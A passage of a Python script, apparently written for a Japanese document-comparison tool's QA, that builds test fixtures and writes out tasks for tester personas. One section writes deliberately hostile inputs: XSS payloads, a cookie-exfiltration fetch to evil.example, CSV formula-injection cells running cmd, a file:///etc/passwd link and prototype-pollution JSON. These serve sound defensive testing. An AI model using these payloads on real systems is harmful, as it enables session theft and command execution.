           '05：末尾の空白だけの違い_A/B.txt（20行）。B の 3行目（半角の空白1つ）・7行目（タブ）・12行目（全角の空白）・15行目（半角の空白2つ）・20行目（空白・タブ・空白）の 5 行に、行末の空白がある。ほかは同じ。空白の比較条件を変えると 0 件になるはず')

    # ---- 06 仕掛けのある中身
    pay = ['<script>alert("r20-txt-1")</script>', '<img src=x onerror=alert("r20-txt-2")>', '"><svg onload=alert("r20-txt-3")>', '<a href="javascript:alert(\'r20-txt-4\')">ここを押す</a>', '<iframe src="https://evil.example/frame"></iframe>', '<img src="https://evil.example/pixel.gif?r20">',
           '</textarea></title></style><script>alert("r20-txt-5")</script>', '{{constructor.constructor("alert(\'r20-txt-6\')")()}}', '<style>*{display:none}</style>', '<meta http-equiv="refresh" content="0;url=https://evil.example/">', '&lt;b&gt;文字参照のまま見えること&lt;/b&gt; &amp;amp;', '<!-- コメント --><plaintext>']
    MA = ['メモ（品質保証部 受入検査）'] + pay + ['通常の行：ここまで']; MB = list(MA); MB[1] = MB[1].replace('r20-txt-1', 'r20-txt-1b'); MB[6] = MB[6].replace('?r20', '?r20b'); MB.insert(13, '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>')
    text(f'{b6}/スクリプト入りメモ_A.txt', '\n'.join(MA) + '\n'); text(f'{b6}/スクリプト入りメモ_B.txt', '\n'.join(MB) + '\n'); assert _only(MA, MB) == (2, 3)
    html = lambda v: f'<!doctype html>\n<html>\n<head>\n<meta charset="utf-8">\n<title>検査成績書 {"B" if v else "A"}</title>\n<script>alert("r20-html-{"b" if v else "a"}")</script>\n<script src="https://evil.example/x.js"></script>\n<link rel="stylesheet" href="https://evil.example/x.css">\n</head>\n<body onload="alert(\'r20-html-onload\')">\n<h1>検査成績書</h1>\n<p>ロット L2611-013　判定：{"保留" if v else "合格"}</p>\n<img src="x" onerror="alert(\'r20-html-img\')">\n<form action="https://evil.example/post"><input name="pw" type="password"></form>\n</body>\n</html>\n'
    text(f'{b6}/スクリプト入りページ_A.html', html(0)); text(f'{b6}/スクリプト入りページ_B.html', html(1))
    svg = lambda v: f'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600" height="400" onload="alert(\'r20-svg-onload\')">\n<script>alert("r20-svg-script")</script>\n<rect width="600" height="400" fill="#ffffff"/>\n<rect x="{80 if not v else 140}" y="120" width="200" height="160" fill="#1a73e8"/>\n<circle cx="450" cy="200" r="70" fill="{"#e53935" if not v else "#43a047"}"/>\n<image xlink:href="https://evil.example/svg.png" width="10" height="10"/>\n<foreignObject width="200" height="80"><body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(\'r20-svg-fo\')"/></body></foreignObject>\n<a xlink:href="javascript:alert(\'r20-svg-link\')"><text x="20" y="40" font-size="24">検査位置図</text></a>\n</svg>\n'
    text(f'{b6}/スクリプト入り図_A.svg', svg(0)); text(f'{b6}/スクリプト入り図_B.svg', svg(1))
    csv = lambda v: '担当,メモ,数量\n田中,=1+1,10\n鈴木,"=cmd|\' /C calc\'!A0",20\n佐藤,"=HYPERLINK(""https://evil.example/?d=""&A1,""ここを押す"")",30\n高橋,+SUM(1+9)*cmd|\' /C calc\'!A0,' + ('45' if v else '40') + '\n伊藤,-2+3+cmd|\' /C notepad\'!A0,50\n渡辺,@SUM(A1:A2),60\n山本,"\t=1+1（先頭にタブ）",70\n' + ('中村,=IMPORTXML("https://evil.example/x","//a"),80\n' if v else '')
    text(f'{b6}/数式で始まるセル_A.csv', csv(0)); text(f'{b6}/数式で始まるセル_B.csv', csv(1))
    def jsdoc(path, v):
        dd = docx.Document(); dd.add_heading('取引先ポータルのご案内', 1); dd.add_paragraph('検査成績書は、' + ('12月15日' if v else '12月1日') + 'から取引先ポータルで受け取れます。'); dd.add_paragraph('本文の中のタグ：<script>alert("r20-docx-body")</script> <img src=x onerror=alert("r20-docx-img")>')
        for label, url in (('ポータルを開く（javascript: のリンク）', 'javascript:alert("r20-docx-link")'), ('手順書（file: のリンク）', 'file:///etc/passwd'), ('ログイン（外部のリンク）', 'https://evil.example/login?from=docx')):
            p = dd.add_paragraph('リンク：'); rid = dd.part.relate_to(url, 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink', is_external=True)
            p._p.append(parse_xml(f'<w:hyperlink {W_NS} xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="{rid}"><w:r><w:t>{esc(label)}</w:t></w:r></w:hyperlink>'))
        dd.save(P(path))
    jsdoc(f'{b6}/javascriptのリンクを含むWord_A.docx', 0); jsdoc(f'{b6}/javascriptのリンクを含むWord_B.docx', 1)
    key(d, '06_仕掛けのある中身：スクリプト入りメモ_A.txt（14行）→ _B.txt（15行）＝2行目 r20-txt-1→r20-txt-1b／7行目 ?r20→?r20b／B の14行目に <script>fetch(…)</script> の行を追加。script・img onerror・svg onload・javascript: のリンク・iframe・外部画像・style・meta refresh などの行が、文字のまま表示されること',
           '06：スクリプト入りページ_A/B.html（16行。テキストとして比べられること）＝5行目の title（A→B）／6行目の alert の文字（a→b）／12行目 判定：合格→保留。　スクリプト入り図_A/B.svg（script・onload・外部画像・foreignObject・javascript: のリンクを含む）＝青い四角が右へ 60 ずれる（x 80→140）／丸の色 赤→緑',
           '06：数式で始まるセル_A.csv（8行）→ _B.csv（9行）＝5行目（高橋）数量 40→45／B の9行目（中村、=IMPORTXML(…)）を追加。= + - @ タブで始まるセルがある。ツールが出力する CSV・レポートを表計算ソフトで開いたとき、数式として動かない形になっているか',
           '06：javascriptのリンクを含むWord_A/B.docx（本文に script と img のタグの文字、リンクが3つ＝javascript:alert(…)・file:///etc/passwd・https://evil.example/login）＝本文の日付 12月1日→12月15日 だけが違う。リンクが押せる形で画面・レポートに出ないこと')
    # 注釈ファイル（JSON）。「正常」は、ツールが書き出す形（app: shibadiff, version: 2）に合わせてある。対象は 07 の 受入検査仕様書_20ページ_A.pdf
    tgt = '受入検査仕様書_20ページ_A.pdf'; tb = rb(f'{b7}/{tgt}'); meta = {'side': 0, 'name': tgt, 'size': len(tb), 'rot': 0, 'sha256': hashlib.sha256(tb).hexdigest()}
    good = {'app': 'shibadiff', 'version': 2, 'savedAt': '2026-11-27T02:30:00.000Z', 'author': '品質保証部 検査係', 'files': [dict(meta, annotations={'0': [{'t': 'rect', 'c': '#1e88e5', 'lw': 2, 'x': 50, 'y': 110, 'w': 400, 'h': 30}, {'t': 'note', 'x': 320, 'y': 160, 'text': 'この項目を確認', 'bg': '#fff59d'}],
                                                                                                                                                    '2': [{'t': 'pen', 'c': '#e53935', 'w': 2, 'p': [[60, 200], [140, 212], [230, 204], [300, 216]]}]})], 'notes': {}}
    gj = json.dumps(good, ensure_ascii=False, indent=1); aj = f'{b6}/注釈ファイル'
    text(f'{aj}/注釈_1_正常（四角・付箋・ペンの3つ）.json', gj); text(f'{aj}/注釈_2_途中で切れている.json', gj[:len(gj) * 6 // 10]); text(f'{aj}/注釈_3_JSONだが形式が違う（filesが配列でない）.json', json.dumps({'app': 'shibadiff', 'version': 2, 'files': 'これは配列ではありません', 'notes': []}, ensure_ascii=False))
    text(f'{aj}/注釈_4_中身がnull.json', 'null'); text(f'{aj}/注釈_5_JSONでない（HTML）.json', '<html><script>alert("r20-ann-html")</script></html>')
    evil = {'app': 'shibadiff', 'version': 2, 'savedAt': '<img src=x onerror=alert("r20-ann-date")>', 'author': '<script>alert("r20-ann-author")</script>', '__proto__': {'polluted': 'yes'}, 'constructor': {'prototype': {'polluted2': 'yes'}},
            'files': [dict(meta, rot=45, annotations={'0': [{'t': 'note', 'x': 100, 'y': 100, 'text': '<img src=x onerror=alert("r20-ann-note")>', 'bg': '"><script>alert("r20-ann-bg")</script>'}, {'t': 'rect', 'c': 'red;background:url(https://evil.example/c)', 'x': 1e308, 'y': -1e308, 'w': 'NaN', 'h': {'toString': 'x'}},
                                                            {'t': 'pen', 'c': '#e53935', 'w': 2, 'p': 'これは配列ではありません'}, {'t': 'stamp', 'x': 10, 'y': 10, 'text': '廃止された種類'}, None, 'ただの文字', {'t': 'pen', 'c': '#e53935', 'w': 99999, 'p': [[i % 500, (i * 7) % 700] for i in range(30000)]}],
                                                      '__proto__': [{'t': 'note', 'x': 1, 'y': 1, 'text': 'proto'}], '99999': [{'t': 'note', 'x': 50, 'y': 50, 'text': '存在しないページの付箋'}], 'abc': [{'t': 'note', 'x': 1, 'y': 1, 'text': 'ページ番号が文字'}], '1': 'これは配列ではありません'}),
                      {'side': 1, 'name': '<img src=x onerror=alert("r20-ann-name")>.pdf', 'size': -1, 'rot': 90, 'annotations': {'0': [{'t': 'note', 'x': 30, 'y': 30, 'text': '別の文書用の付箋'}]}}, None, 'ただの文字'],
            'notes': {'t:1': {'st': 'ok', 'text': '<script>alert("r20-ann-comment")</script>', 'by': '<b>太字</b>', 'at': 'きのう'}, '__proto__': {'st': 'ok', 'text': 'proto'}, 'x:bad-id': {'st': 'ok', 'text': '番号の形が違う'}, 't:2': 'ただの文字'}}
    ej = json.dumps(evil, ensure_ascii=False, indent=1); assert '"__proto__"' in ej; text(f'{aj}/注釈_6_仕掛け（タグ・巨大な数・__proto__・型の違い）.json', ej)
    many = dict(good, files=[dict(meta, annotations={'0': [{'t': 'note', 'x': 20 + (i % 50) * 10, 'y': 40 + (i // 50) * 6, 'text': f'付箋 {i + 1}', 'bg': '#fff59d'} for i in range(6000)]})]); text(f'{aj}/注釈_7_1ページに付箋6000枚.json', json.dumps(many, ensure_ascii=False))
    ls = [{'説明': 'JSON として壊れた値', '値': {'doccmp:settings': '{"font": "large", ', 'doccmp:textopts': '{{{{', 'doccmp:pv:zoom': 'undefined'}}, {'説明': '型の違う値', '値': {'doccmp:settings': '[1, 2, 3]', 'doccmp:textopts': '"ただの文字"', 'doccmp:pv:zoom': '{"a": 1}', 'doccmp:pv:width': '"太い"', 'doccmp:pv:toolColor': '"red"', 'doccmp:tvLayout': '12345', 'doccmp:pvChanges': '"はい"'}},
          {'説明': 'タグや細工の入った値', '値': {'doccmp:settings': json.dumps({'author': '<img src=x onerror=alert("r20-ls-author")>', 'font': '"><script>alert("r20-ls-font")</script>', 'persist': 'yes', '__proto__': {'polluted': 1}}, ensure_ascii=False), 'doccmp:pv:zoom': '"<img src=x onerror=alert(\\"r20-ls-zoom\\")>"',
                                              'doccmp:pv:toolColor': '{"pen": "red;background:url(https://evil.example/ls)", "note": 5}', 'doccmp:report:text': '{"title": "<script>alert(\\"r20-ls-report\\")</script>"}'}},
          {'説明': 'とても大きな値（約 4MB。保存領域の上限に近い）', '値の作り方': "localStorage.setItem('doccmp:settings', JSON.stringify({author: 'あ'.repeat(2000000)}))"}]
    text(f'{b6}/保存領域（localStorage）に入れる壊れた値.json', json.dumps(ls, ensure_ascii=False, indent=1))
    key(d, f'06/注釈ファイル（ページ表示の「注釈の読み込み」に使う。対象は 07 の {tgt}。ページ番号のキーは 0 が1ページ目）：1_正常＝1ページ目に四角1つ・付箋1枚、3ページ目にペン1本の計 3 個／2_途中で切れている（JSON として読めない）／3_filesが配列でない／4_中身がnull／5_JSONでない（HTML）／'
           '6_仕掛け＝付箋の文字・色・記入者・日時・ファイル名・コメントに script や img onerror、色に外部 URL、座標に 1e308・"NaN"・オブジェクト、回転 45、廃止された種類 stamp、null、3万点のペン、__proto__ のキー、ページ番号 99999・abc、別の文書（side 1）用の付箋、形の違うコメント／7_1ページに付箋6000枚（上限 5,000 を超える）。'
           '読めないものは理由の分かる案内が出て、いま付いている注釈が消えないこと。6・7 では、読み飛ばした数が知らされること、alert が出ないこと、通信しないこと',
           '06/保存領域（localStorage）に入れる壊れた値.json：ツールが使うキー（doccmp: で始まる）に入れる値の例を 4 組（壊れた JSON／型の違い／タグや細工／とても大きな値）。入れてからページを開き直して、起動できるか・設定の画面が開けるか・「保存データの管理」で消せるかを見る')


# ==========================================================================================
_B17 = {
    'who': '総務部の事務職（勤続14年）。腱鞘炎でマウスが使えず、パソコンの操作はすべてキーボードで行う。画面の読み上げソフトも併用する。'
           '規程の改定や議事録の版の違いを確かめる仕事が多く、Tab の順番、フォーカスの位置が見えること、ショートカットを頼りにしている。',
    'tasks': [
        '**マウスの操作（click・ドラッグ・hover）は使わない。`page.keyboard` だけで操作する**（ファイルの読み込みだけは `set_input_files` を使ってよい）。まず何も読み込まない状態で、Tab・Shift+Tab で画面のすべての操作部品（ファイル欄・タブ・ツールバー・設定・ヘルプ）に届くか、順番は自然か、**フォーカスの位置が目で見えるか**を、進むごとのスクリーンショットで確かめる',
        '`議事録_安全衛生委員会_2026年11月_案.txt` と `…_確定.txt` を読み込み、テキスト比較で：差分の移動（次・前・最初・最後）、コピー（左右への反映と、元に戻す）、検索、比較条件、設定、ヘルプ、テキストの入力（開く・適用・Esc）、ファイルを閉じる、左右の入れ替え、をキーボードだけで行う。`慶弔見舞金規程_現行.docx`・`慶弔見舞金規程_改定案.docx`・`慶弔見舞金規程_改定案（変更履歴つき）.docx` でも確かめる（変更履歴が残っているという知らせに、キーボードと読み上げで気づけるか）',
        '`備品購入申請書_初版.pdf` と `備品購入申請書_再提出.pdf`（3ページ）で、ページ表示（ページ送り・拡大）と注釈（キーボードで何ができるか。できないことは、その案内があるか）。`座席レイアウト_変更前.png` と `座席レイアウト_変更後.png` で、重ね合わせ（表示方法の切り替え・変更箇所の移動・一括チェックの表）。フォルダ `共有フォルダ_10月末` と `共有フォルダ_11月末` で、フォルダ比較（行の選択・開く・一覧へ戻る）',
        'ダイアログ（設定・ヘルプ・テキストの入力・確認・パスワード）の中でフォーカスが閉じ込められるか、Esc で閉じられるか、閉じたあと元の場所にフォーカスが戻るか、吹き出し（比較条件など）が開いたまま残らないか。パスワードの入力は、左に `冬季賞与支給案_初版.pdf`、右に `冬季賞与支給案_修正版（パスワード付き）.pdf`（パスワード `soumu-2026`）で確かめる。まちがったパスワードを入れたとき、Esc でやめたときも',
        '読み上げ用の情報を、DOM の属性（`aria-*`・`role`・`title`・`label`）で確かめる：アイコンだけのボタンに名前があるか、押した状態（`aria-pressed`・`aria-selected`・`aria-expanded`）、入力欄の名前、比較の結果や通知が読み上げられる形（`aria-live`・`role=status`）か、差分の行の種類（追加・削除・変更）が色以外でも伝わるか',
        '画面を狭くしたとき（幅 700px）のツールバー：キーボードですべてのボタンに届くか、フォーカスのあるボタンが見える位置まで送られるか、見えないボタンにフォーカスが行ったままにならないか',
        'ショートカットの一覧がヘルプにあるか、書かれているとおりに動くか。ブラウザや読み上げソフトの操作とぶつかるものがないか'],
    'note': 'パスワード付き PDF のパスワードは `soumu-2026`。フォルダの読み込みは `t.load_folders(左, 右)` を使ってよい（フォルダを選ぶ画面は headless では出せないため）。それ以外で `t.click` や `page.mouse` を使ったときは、報告にそのことを書く。'}

_B18 = {
    'who': '業務用の空調機器を売る外回りの営業（入社9年）。客先や移動中に、タブレット（縦持ち 768×1024・タッチ）や小さなノート PC（1280×720、文字を 150% に拡大）で、見積や契約書の版の違いを確かめる。'
           'スマートフォン（390×844）で見ることもある。机に戻る時間がないので、その場で違いが分かること、指で操作できることを重視する。',
    'tasks': [
        '`Tool(out_dir, width=768, height=1024, mobile=True)` などで画面を変える（タッチは `page.touchscreen.tap(x, y)`）。768×1024（タッチ）・390×844（タッチ）・1280×720・**720×450（1440×900 を 200% に拡大した状態に当たる）**のそれぞれで、`御見積書_Q-2611-0457_第1版.pdf` と `…_第2版.pdf` を読み込み、テキスト比較・ページ表示・重ね合わせの各画面が使えるか。重なり・はみ出し・押せないボタン・切れた文字がないかを、スクリーンショットで確かめる',
        'ツールバーが横に送れるか、端に「続きがある」目印が出るか、吹き出し（比較条件）・ダイアログ・ヘルプ・設定が画面に収まるか、閉じられるか（`空調設備保守契約書_当社案.docx` と `空調設備保守契約書_先方修正版.docx`、`標準価格表_2026年度上期.xlsx` と `標準価格表_2026年度下期.xlsx` で）',
        'タッチで：ファイル欄の操作（開く・閉じる・入れ替え）、差分の移動、重ね合わせの拡大・移動・スワイプの境界（`カタログ_p12_TCAシリーズ_旧.jpg` と `カタログ_p12_TCAシリーズ_新.jpg`）、ページ表示のスクロールと注釈（ペン・付箋）、フォルダ一覧の行を開く（`提案書一式_みなと総合病院様_初回提出` と `提案書一式_みなと総合病院様_再提出`）',
        '設定の「文字の大きさ：大」にしたときの崩れ。長いファイル名（`【重要】２０２６年度下期…第３稿.txt` と `…第３稿（支店長確認済み）.txt`。末尾だけが違う）を左右に読み込んだときの、ファイル欄・タブ・状態表示・レポートでの見え方（違う部分が見えるか、はみ出さないか）',
        '縦と横の持ち替え（比較の途中で画面の大きさを 768×1024 ↔ 1024×768 に変える）。スクロールの位置・選んでいる差分・開いている吹き出しが、おかしくならないか',
        '見積書・契約書・価格表のそれぞれでレポートを出し、小さな画面（390×844）で開いて読めるか（横にはみ出さないか、表が読めるか）。見つけた変更点を、客先でそのまま説明に使えるか'],
    'note': '`t.load` と `t.load_folders` は、画面の大きさに関係なく使える。タッチの操作は `page.touchscreen.tap`、スワイプは `page.mouse` ではなく CDP の `Input.dispatchTouchEvent`（touchStart → touchMove → touchEnd）で送る。長い名前のファイルは `glob` で探すとよい。'}

_B20 = {
    'who': '品質保証部のテスター（テスト歴12年）。リリースの判定のために、壊れたファイル・変わったファイル・意地悪な操作で、ツールを壊そうとする。'
           '探すのは「データが黙って失われる」「まちがった結果を、正しいかのように出す」「固まる・落ちる」「スクリプトが動く・外部と通信する」の4つ。うまく動くことの確認より、壊れ方を調べるのが仕事。',
    'tasks': [
        '`01_壊れたファイル`・`02_拡張子と中身が違う`・`03_パスワード付き`（パスワードは `qa-2026`、日本語のものは `ひみつのかぎ`。ファイル名にも書いてある）のファイルを1つずつ読み込み（相手には「正常な…（比較の相手用）」や `07_ふつうのファイル` を使う）、落ちない・固まらない・**理由の分かる案内が出る**・**前に読み込んだファイルの結果と取り違えない**（左右の欄の名前と、表示されている中身が合っているか）を確かめる。暗号化された Office 文書（`暗号化されたWord（パスワード qa-2026）.docx`）とマクロつき（`.xlsm`・`.docm`）の扱いも',
        '`04_変わった名前` の A・B をフォルダ比較し、22 個すべてが正しい相手と比べられるか（大文字小文字だけ違う2つ、見た目が同じ NFC と NFD の2つを取り違えないか）、一覧・ファイル欄・タブ・レポート・ダウンロードの名前で表示が崩れないか。向きを変える文字（U+202E）の入った名前で、拡張子を見誤らないか。1つずつ左右に読み込んだときも',
        '`05_変わった中身のテキスト` の組をそれぞれ比べ、違いの数と場所が合っているか、見えない文字（NUL・BOM・ゼロ幅・向きの制御・結合文字）の違いが「どこが違うのか分かる形」で出るか、1行 100万文字・空行 10万行で固まらないか（秒数を測る）。比較条件（空白・空行・全角半角・大文字小文字）をすべてオンにしたときも',
        '`06_仕掛けのある中身` の txt・html・svg・csv・docx を読み込み、**スクリプトが動かないこと（alert が出ない。`t.errors` に DIALOG が出ない）、外部と通信しないこと（evil.example への request が出ない）**を確かめる。レポート・パッチ・CSV を出力して、そのファイルをブラウザで開いたときも。`06_仕掛けのある中身/注釈ファイル` の7つを、`07_ふつうのファイル/受入検査仕様書_20ページ_A.pdf` を開いた状態でページ表示の「注釈の読み込み」から読み込む',
        '操作の割り込み（`07_ふつうのファイル` と、重いファイル＝`05_…/1行100万文字_A.txt`・`とても多い空行_A.txt` を使う）：読み込み中に別のファイルを読み込む・タブを切り替える・閉じる・左右を入れ替える、ボタンの連打（次へ・コピー・元に戻す・レポート）、比較条件をすべてオンにする、処理中の中止。終わったあとの画面が、最後に指示した状態と合っているか',
        '保存していない注釈・コメント・編集（テキストの入力や、差分のコピー）があるときの、閉じる・再読み込み（`page.reload()`）・別ファイルの読み込み：確認が出るか、「やめる」を選んだらデータが残るか、**黙って消えないか**。確認のダイアログが出ているあいだに、さらにファイルをドロップしたとき',
        'ブラウザの保存領域：`06_仕掛けのある中身/保存領域（localStorage）に入れる壊れた値.json` の値を `localStorage.setItem` で入れてから開き直す。保存領域が使えないとき（`page.add_init_script` で `localStorage` の `getItem`・`setItem` が例外を投げるようにする）の起動と設定の変更。同じファイルを左右に入れる、空のファイルどうし（`01_壊れたファイル/0バイト_A.txt` と `0バイト_B.txt`）、片側だけ、3つ以上を一度にドロップ'],
    'note': 'パスワード：PDF と暗号化された Office 文書は `qa-2026`、日本語のパスワードの PDF は `ひみつのかぎ`。このフォルダのファイルは、わざと壊してある・仕掛けてあるもの。`正解.md` には、それぞれのファイルの中身（何が入っているか・どこが違うか）を書いてある。'
            '「どう表示されるのが正しいか」が決まっていないもの（見えない文字など）は、ユーザーが困らないか・だまされないか、で判断する。壊れたファイルで「読めません」と出るのは正しい動き（理由が分かれば不具合ではない）。'}

_B16 = {
    'who': 'スーパーマーケットの本部で店舗運営を担当して11年。店舗マニュアルや価格表の改定版が出るたびに、前の版と比べて、店長向けに「どこが変わったか」をまとめて送る。'
           'Excel はふだんから使うが、パソコンの専門用語（文字コード、差分、正規化など）は苦手。見落としがあると店で値段や手順をまちがえるので、数字と番号の変更を特に気にする。',
    'tasks': [
        '`店舗運営マニュアル_第5版.pdf` と `店舗運営マニュアル_第6版.pdf`（20ページほど）をテキスト比較とページ表示で比べ、店長に知らせる変更点を箇条書きにする。手順が1つ増えて番号がずれた所、章の順番が入れ替わった所、1ページ増えてページがずれた所で、**変わっていない文が「変更」として大量に出ないか**、本当に変わった数字（時刻・温度・日数）を見落とさないか',
        '同じ内容の `店舗運営マニュアル_第5版_研修用スライド.pptx` と `…第6版_研修用スライド.pptx` を比べ、PDF で見つけた変更と同じものが見つかるか。PDF と PowerPoint で、見つかる変更や見え方が食い違わないか',
        '`価格表_2026年11月.xlsx` と `価格表_2026年12月改定.xlsx`（1,500行）を比べ、値上げ・終売（行がなくなった）・新商品（行が増えた）・税率区分の変更を、それぞれ何件か数える。行が増減したあとの行を、すべて「変更」にしていないか。税込売価（数式）がどう表示されるか。**色だけを変えたセル**が新しい表にあるが、それに気づけるか（気づけないなら、そのことが分かるか）',
        '`POP_週末特売_たまご_初版.png` と `POP_週末特売_たまご_修正版.png` を重ね合わせで比べ、変わった所をすべて挙げる（大きな数字だけでなく、小さな注記や色も）',
        '`シフト表_緑が丘店_11月30日週_初版.xlsx` と `…_改訂.xlsx` を比べ、だれの・いつの勤務が変わったかを挙げる。時刻が「9:00」のように読めるか、結合したセル（休）や色分けがどう扱われるか',
        '`本部通達_第2026-118号.txt` と `本部通達_第2026-118号_訂正版.txt` を比べる。文字化けせずに読めるか（丸数字・㈱・㍑・℡・ローマ数字・半角カナ）。比較の条件の「全角半角を区別しない」をオンにしたとき、**「①」と「(1)」や「1」、「㍑」と「リットル」が同じ扱いになって見落とさないか**。逆に、半角カナと全角カナの違いだけの行は消えるか',
        'マニュアル・価格表・通達のそれぞれでレポートを出し、そのまま店長に渡せるかを見る（どこが変わったかが、ツールを知らない人にも分かるか）。画面・通知・レポートの言葉で、意味の分からなかったものをすべて書き出す'],
    'note': 'このレビュアーは専門用語が苦手、という前提で見る（「エンコーディング」「正規化」「バイナリ」などの言葉が、説明なしに出てこないか）。価格表は行数が多いので、読み込みと比較の秒数も測る。'}

SPEC = [x for x in [
    (16, '店舗運営担当', 'スーパーマーケット本部', globals().get('r16'), globals().get('_B16')),
    (17, 'キーボードだけで操作する事務職', '総務部', globals().get('r17'), globals().get('_B17')),
    (18, 'タブレットと小さな画面で使う営業', '営業部', globals().get('r18'), globals().get('_B18')),
    (19, '性能・大容量の確認担当', '情報システム部', globals().get('r19'), globals().get('_B19')),
    (20, '異常系テスター', '品質保証部', globals().get('r20'), globals().get('_B20'))] if x[3] and x[4]]
